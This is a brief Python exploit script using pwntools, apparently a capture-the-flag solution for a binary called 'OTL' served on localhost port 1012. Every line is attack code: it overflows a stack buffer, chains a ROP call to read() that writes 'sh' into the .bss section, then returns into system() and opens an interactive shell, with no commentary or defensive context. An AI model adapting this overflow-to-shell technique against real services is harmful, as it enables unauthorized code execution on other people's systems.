from pwn import *

p = remote("localhost", 1012)
#p = process("./OTL")
e = ELF("./OTL")

pppr = 0x080486b9
pr = 0x080483b1

pay = 'a' * 0xC
pay += p32(e.sym['initialization'])

p.sendafter("now?\n", pay)

pay = 'a' * 12
pay += p32(e.plt['read'])
pay += p32(pppr)
pay += p32(0)
pay += p32(e.bss())
pay += p32(len("sh"))
pay += p32(e.sym['initialization'])

p.sendafter("bed?\n", pay)
sleep(0.5)
p.send("sh")

pay = 'a' * 12
pay += p32(e.plt['system'])
pay += p32(pr)
pay += p32(e.bss())
pay += 'a' * 4

sleep(0.5)
p.send(pay)
p.interactive()
